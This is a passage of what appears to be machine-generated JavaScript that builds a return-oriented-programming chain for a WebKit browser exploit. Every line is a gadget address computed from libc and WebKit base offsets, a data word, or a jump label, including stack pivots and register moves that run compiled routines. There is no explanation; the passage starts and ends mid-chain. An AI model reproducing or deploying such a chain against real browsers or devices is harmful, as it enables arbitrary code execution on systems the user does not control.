libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+168984,//L2486
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+168968,//L2487
webkit_base+4687784,
libc_base+768796
]);
//L2487:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2486:
db([0,0]);
//___bswap32_var:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+169056,//L2489
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2489:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+169168,//L2492
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+169184,//L2493
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L2490:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L2492:
db([0,0]);
set_gadget(libc_base+772328,);
//L2493:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+169272,//L2495
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+169288,//L2496
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2495:
db([0,0]);
set_gadget(libc_base+772328,);
//L2496:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+169448,//L2498
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+169480,//L2500
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+169432,//L2497
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+169464,//L2499
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2497:
db([0,0]);
set_gadget(libc_base+165442,);
//L2498:
db([0,0]);
set_gadget(libc_base+772328,);
//L2499:
db([0,0]);
set_gadget(libc_base+768796,);
//L2500:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+169640,//L2504
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+169592,//L2501
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+169608,//L2502
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2501:
db([0,0]);
set_gadget(libc_base+165442,);
//L2502:
db([0,0]);
set_gadget(libc_base+772328,);
//L2503:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L2504:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+169776,//L2506
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+169792,//L2507
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+169760,//L2505
webkit_base+4687784,
libc_base+165442
]);
//L2505:
db([0,0]);
set_gadget(libc_base+772328,);
//L2506:
db([0,0]);
set_gadget(libc_base+768796,);
//L2507:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+169896,//L2508
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+169912,//L2509
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2508:
db([0,0]);
set_gadget(libc_base+768796,);
//L2509:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+170032,//L2510
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+170016,//L2511
webkit_base+4687784,
libc_base+768796
]);
//L2511:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2510:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+170120,//L2513
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+170104,//L2512
webkit_base+4687784,
libc_base+165442
]);
//L2512:
db([0,0]);
set_gadget(libc_base+768796,);
//L2513:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+170224,//L2514
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+170240,//L2515
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2514:
db([0,0]);
set_gadget(libc_base+768796,);
//L2515:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+170360,//L2516
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+170344,//L2517
webkit_base+4687784,
libc_base+768796
]);
//L2517:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2516:
db([0,0]);
//___bswap16_var:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+170432,//L2519
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2519:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+170544,//L2522
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+170560,//L2523
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278
]);
//L2520:
db([16,0]);// 0x10
set_gadget(webkit_base+1420514,);//pop r8
//L2522:
db([0,0]);
set_gadget(libc_base+772328,);
//L2523:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+170648,//L2525
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+170664,//L2526
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2525:
db([0,0]);
set_gadget(libc_base+772328,);
//L2526:
db([0,0]);
set_gadgets([
libc_base+229840,//mov ax,[rdi]
libc_base+713278,
ropchain+170824,//L2530
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+170776,//L2527
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+170792,//L2528
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2527:
db([0,0]);
set_gadget(libc_base+165442,);
//L2528:
db([0,0]);
set_gadget(libc_base+772328,);
//L2529:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L2530:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+170880,//L2532
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2532:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+170992,//L2533
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+171024,//L2535
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+171008,//L2534
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2533:
db([0,0]);
set_gadget(libc_base+772328,);
//L2534:
db([0,0]);
set_gadget(libc_base+768796,);
//L2535:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+171184,//L2539
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+171136,//L2536
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+171152,//L2537
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2536:
db([0,0]);
set_gadget(libc_base+165442,);
//L2537:
db([0,0]);
set_gadget(libc_base+772328,);
//L2538:
db([48,0]);
set_gadget(libc_base+768796,);
//L2539:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+171288,//L2541
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+171272,//L2540
webkit_base+4687784,
libc_base+772328
]);
//L2540:
db([0,0]);
set_gadget(libc_base+768796,);
//L2541:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2542:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L2543:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+857161,
libc_base+713278,
ropchain+171496,//L2546
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+171464,//L2544
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2544:
db([0,0]);
set_gadget(libc_base+772328,);
//L2545:
db([48,0]);
set_gadget(libc_base+768796,);
//L2546:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+171600,//L2548
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+171584,//L2547
webkit_base+4687784,
libc_base+772328
]);
//L2547:
db([0,0]);
set_gadget(libc_base+768796,);
//L2548:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+171696,//L2551
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2549:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2551:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+171784,//L2553
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+171800,//L2554
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2553:
db([0,0]);
set_gadget(libc_base+772328,);
//L2554:
db([0,0]);
set_gadgets([
libc_base+229840,//mov ax,[rdi]
libc_base+713278,
ropchain+171960,//L2558
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+171912,//L2555
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+171928,//L2556
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2555:
db([0,0]);
set_gadget(libc_base+165442,);
//L2556:
db([0,0]);
set_gadget(libc_base+772328,);
//L2557:
db([16,0]);// 0x10
set_gadget(libc_base+768796,);
//L2558:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+713278,
ropchain+172016,//L2560
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+165442
]);
//L2560:
db([0,0]);
set_gadgets([
libc_base+288783,
libc_base+713278,
ropchain+172128,//L2561
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+172160,//L2563
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+172144,//L2562
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2561:
db([0,0]);
set_gadget(libc_base+772328,);
//L2562:
db([0,0]);
set_gadget(libc_base+768796,);
//L2563:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+172320,//L2567
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+172272,//L2564
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+172288,//L2565
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2564:
db([0,0]);
set_gadget(libc_base+165442,);
//L2565:
db([0,0]);
set_gadget(libc_base+772328,);
//L2566:
db([48,0]);
set_gadget(libc_base+768796,);
//L2567:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+172424,//L2569
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+172408,//L2568
webkit_base+4687784,
libc_base+772328
]);
//L2568:
db([0,0]);
set_gadget(libc_base+768796,);
//L2569:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2570:
db([8,0]);// 0x8
set_gadget(libc_base+772328,);
//L2571:
db([8,0]);// 0x8
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+172624,//L2574
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+172592,//L2572
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2572:
db([0,0]);
set_gadget(libc_base+772328,);
//L2573:
db([32,0]);// 0x20
set_gadget(libc_base+768796,);
//L2574:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+172728,//L2576
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+172712,//L2575
webkit_base+4687784,
libc_base+772328
]);
//L2575:
db([0,0]);
set_gadget(libc_base+768796,);
//L2576:
db([0,0]);
set_gadgets([
libc_base+857183,
libc_base+713278,
ropchain+172840,//L2579
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+172808,//L2577
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2577:
db([0,0]);
set_gadget(libc_base+772328,);
//L2578:
db([48,0]);
set_gadget(libc_base+768796,);
//L2579:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+172904,//L2581
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+772328
]);
//L2581:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278,
ropchain+172960,//L2583
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+772328
]);
//L2583:
db([0,0]);
set_gadget(libc_base+713278,);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
webkit_base+72932,//or rax,rcx
libc_base+713278,
ropchain+173112,//L2585
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+173128,//L2586
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+173096,//L2584
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2584:
db([0,0]);
set_gadget(libc_base+165442,);
//L2585:
db([0,0]);
set_gadget(libc_base+768796,);
//L2586:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+173288,//L2590
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+173240,//L2587
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+173256,//L2588
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2587:
db([0,0]);
set_gadget(libc_base+165442,);
//L2588:
db([0,0]);
set_gadget(libc_base+772328,);
//L2589:
db([48,0]);
set_gadget(libc_base+768796,);
//L2590:
db([0,0]);
set_gadgets([
libc_base+857161,
libc_base+857183,
libc_base+713278,
ropchain+173424,//L2592
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+173440,//L2593
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+173408,//L2591
webkit_base+4687784,
libc_base+165442
]);
//L2591:
db([0,0]);
set_gadget(libc_base+772328,);
//L2592:
db([0,0]);
set_gadget(libc_base+768796,);
//L2593:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+173544,//L2594
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+173560,//L2595
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2594:
db([0,0]);
set_gadget(libc_base+768796,);
//L2595:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+173680,//L2596
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+173664,//L2597
webkit_base+4687784,
libc_base+768796
]);
//L2597:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2596:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+173768,//L2599
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+173752,//L2598
webkit_base+4687784,
libc_base+165442
]);
//L2598:
db([0,0]);
set_gadget(libc_base+768796,);
//L2599:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+173872,//L2600
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+173888,//L2601
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2600:
db([0,0]);
set_gadget(libc_base+768796,);
//L2601:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+174008,//L2602
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+173992,//L2603
webkit_base+4687784,
libc_base+768796
]);
//L2603:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2602:
db([0,0]);
//_get_tclass:
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+174080,//L2605
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2605:
db([0,0]);
set_gadgets([
libc_base+430587,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+174144,//L2607
webkit_base+4687784,
libc_base+740138,//mov rax,r8
webkit_base+1420514 //pop r8
]);
//L2607:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2608:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2610:
db([4,0]);// 0x4
set_gadgets([
libc_base+507828,//add rax,rsi
webkit_base+972324,//mov [rax],ecx
libc_base+713278,
ropchain+174288,//L2613
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2611:
db([4294967288,4294967295]);// -0x8
set_gadget(libc_base+772328,);
//L2613:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+174392,//L2615
webkit_base+4687784,
libc_base+713278
]);
//L2614:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+768796,);
//L2615:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2616:
db([61,0]);// 0x3d
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796
]);
//L2617:
db([41,0]);// 0x29
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+713278,
ropchain+174592,//L2620
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2618:
db([16,0]);// 0x10
set_gadget(libc_base+772328,);
//L2620:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+174680,//L2622
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+174696,//L2623
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2622:
db([0,0]);
set_gadget(libc_base+772328,);
//L2623:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+174856,//L2625
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+174888,//L2627
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+174840,//L2624
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+174872,//L2626
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2624:
db([0,0]);
set_gadget(libc_base+165442,);
//L2625:
db([0,0]);
set_gadget(libc_base+772328,);
//L2626:
db([0,0]);
set_gadget(libc_base+768796,);
//L2627:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+174984,//L2629
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+174968,//L2628
webkit_base+4687784,
libc_base+165442
]);
//L2628:
db([0,0]);
set_gadget(libc_base+768796,);
//L2629:
db([0,0]);
set_gadget(libc_base+713278,);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+768796,
//L2631:
ropchain+175088,//L2630
libc_base+713278
]);
db([8,0]);// 0x8
set_gadgets([
libc_base+207036,
libc_base+430587,
libc_base+489696,//pop rsp
ropchain+177168,//L2632
//L2630:
libc_base+863109,//mov rax,rcx
libc_base+713278
]);
db([4294967256,4294967295]);// -0x28
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+175232,//L2634
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+175248,//L2635
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+175216,//L2633
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2633:
db([0,0]);
set_gadget(libc_base+165442,);
//L2634:
db([0,0]);
set_gadget(libc_base+768796,);
//L2635:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+175376,//L2638
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+175408,//L2640
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+175392,//L2639
webkit_base+4687784,
libc_base+713278
]);
//L2637:
db([0,0]);
set_gadget(webkit_base+3789839,);//pop r11
//L2638:
db([0,0]);
set_gadget(libc_base+165442,);
//L2639:
db([0,0]);
set_gadget(libc_base+768796,);
//L2640:
db([0,0]);
set_gadgets([
webkit_base+11809960,//cmp rax,rsi ;sete al
libc_base+232261,//movzx eax,al
webkit_base+426067,//shl rax,3
libc_base+713278,
ropchain+175520,//L2641+8
libc_base+507828,//add rax,rsi
libc_base+145226,//mov rax,[rax]
libc_base+713278,
ropchain+175512,//L2641
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+489696 //pop rsp
]);
//L2641:
db([0,0]);
set_gadgets([
ropchain+175536,//L2641+24
ropchain+176000,//L2636
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+175608,//L2644
webkit_base+4687784,
libc_base+768796
]);
//L2642:
db([0,0]);
set_gadget(libc_base+165442,);
//L2643:
db([0,0]);
set_gadget(libc_base+772328,);
//L2644:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+175768,//L2646
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+175800,//L2648
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+175752,//L2645
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+175784,//L2647
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2645:
db([0,0]);
set_gadget(libc_base+165442,);
//L2646:
db([0,0]);
set_gadget(libc_base+772328,);
//L2647:
db([0,0]);
set_gadget(libc_base+768796,);
//L2648:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+175880,//L2649
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+175896,//L2650
webkit_base+4687784,
libc_base+165442
]);
//L2649:
db([0,0]);
set_gadget(libc_base+768796,);
//L2650:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+175992,//L2652
webkit_base+4687784,
webkit_base+1816389,//mov rax,r11
libc_base+713278,
ropchain+175976,//L2651
webkit_base+4687784,
libc_base+165442
]);
//L2651:
db([0,0]);
set_gadget(libc_base+768796,);
//L2652:
db([0,0]);
//L2636:
set_gadgets([
libc_base+713278,
ropchain+176056,//L2655
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278
]);
//L2653:
db([4294967292,4294967295]);// -0x4
set_gadget(libc_base+772328,);
//L2655:
db([0,0]);
set_gadgets([
libc_base+507828,//add rax,rsi
libc_base+713278,
ropchain+176144,//L2657
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+176160,//L2658
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+165442
]);
//L2657:
db([0,0]);
set_gadget(libc_base+772328,);
//L2658:
db([0,0]);
set_gadgets([
libc_base+149873,//mov eax,[rdi]
libc_base+713278,
ropchain+176320,//L2660
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+176352,//L2662
webkit_base+4687784,
libc_base+863109,//mov rax,rcx
libc_base+713278,
ropchain+176304,//L2659
webkit_base+4687784,
libc_base+388400,//mov rax,rdi
libc_base+713278,
ropchain+176336,//L2661
webkit_base+4687784,
webkit_base+3789839 //pop r11
]);
//L2659:
db([0,0]);
set_gadget(libc_base+165442,);
//L2660:
db([0,0]);
set_gadget(libc_base+772328,);
//L2661:
db([0,0]);
set_gadget(libc_base+768796,);
//L2662:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+176432,//L2663
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+176448,//L2664
webkit_base+4687784,
libc_base+165442
]);
//L2663:
db([0,0]);
set_gadget(libc_base+768796,);
//L2664:
db([0,0]);
set_gadgets([
webkit_base+6264134,//movsxd rax,edi
libc_base+713278,
ropchain+176576,//L2666
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+176592,//L2667
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+176560,//L2665
webkit_base+4687784,
libc_base+165442
]);
//L2665:
db([0,0]);
set_gadget(libc_base+772328,);
//L2666:
db([0,0]);
set_gadget(libc_base+768796,);
//L2667:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+176696,//L2668
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+176712,//L2669
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2668:
db([0,0]);
set_gadget(libc_base+768796,);
//L2669:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+176832,//L2670
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+176816,//L2671
webkit_base+4687784,
libc_base+768796
]);
//L2671:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2670:
db([0,0]);
set_gadgets([
libc_base+713278,
ropchain+176920,//L2673
webkit_base+4687784,
libc_base+740138,//mov rax,r8
libc_base+713278,
ropchain+176904,//L2672
webkit_base+4687784,
libc_base+165442
]);
//L2672:
db([0,0]);
set_gadget(libc_base+768796,);
//L2673:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+177024,//L2674
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+177040,//L2675
webkit_base+4687784,
webkit_base+1420514 //pop r8
]);
//L2674:
db([0,0]);
set_gadget(libc_base+768796,);
//L2675:
db([0,0]);
set_gadgets([
libc_base+149872,//mov rax,[rdi]
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+713278,
ropchain+177160,//L2676
webkit_base+4687784,
webkit_base+13378624,
libc_base+713278,
ropchain+177144,//L2677
webkit_base+4687784,
libc_base+768796
]);
//L2677:
db([0,0]);
set_gadget(libc_base+489696,);//pop rsp
//L2676:
db([0,0]);
//L2632:
set_gadget(libc_base+713278,);
db([208,0]);// 0xd0
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+165442,
libc_base+430587,
libc_base+713278
]);
db([4294967280,4294967295]);// -0x10
set_gadgets([
libc_base+207036,
libc_base+768796,
libc_base+713278,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+608613,//pop rdx
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+772328,
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+1420514,//pop r8
libc_base+430587,
libc_base+207036,
libc_base+768796,
webkit_base+17972187,//pop r9
libc_base+430587,
libc_base+207036,
libc_base+768796,
libc_base+765305,
libc_base+430587,
libc_base+713278
]);
db([4294967288,4294967295]);// -0x8
set_gadgets([
libc_base+207036,
libc_base+768796,
